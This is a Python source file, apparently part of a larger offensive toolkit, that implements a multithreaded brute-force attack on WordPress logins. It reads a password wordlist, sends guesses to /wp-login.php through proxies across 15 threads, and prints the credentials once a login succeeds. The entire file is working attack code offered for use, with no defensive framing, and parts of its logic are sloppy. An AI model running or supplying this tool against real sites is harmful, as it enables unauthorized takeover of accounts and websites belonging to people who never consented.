import requests
import threading
from lxml.html import *
from script import Contact
import time

user_agent = Contact.userAgent()
proxy = Contact.proxy(None)
proxy = Contact.proxy(proxy)


def wpLogin(host, method, usernameBF, wordlist):
    if method == None:
        passwordFile = open(wordlist, 'r')
        def wpLogin():

            global dead
            dead = False

            req = requests.get(host+"/wp-login.php", headers=user_agent, proxies=proxy)
            page = fromstring(req.content)
            form = page.find('.//form')
            form = form.find('.//input[@name="wp-submit"]').value

            for password in passwordFile:
                password = password.strip()
                data = {'log': usernameBF, 'pwd': password, 'wp-submit': form}

                if dead:
                    break

                login = requests.post(host+'/wp-login.php', data=data).text
                time.sleep(1)

                if "wp-admin-bar-root-default" in login:

                    if dead == False:
                        print('\r[#] Password Found !                                                                    ')
                        print('[$] Username\tPassword')
                        print('\r[!] {}\t{}'.format(usernameBF, password))

                    dead = True
                    return dead

                else:
                    if dead:
                        break
                    print('\r[#] Username: {} password incorrect: [{}]                '.format(usernameBF, password), end= '')

        threads = []

        for i in range(15):
            threadBruteForce = threading.Thread(target=wpLogin)
            threads.append(threadBruteForce)
            threadBruteForce.start()
        if dead:
            pass
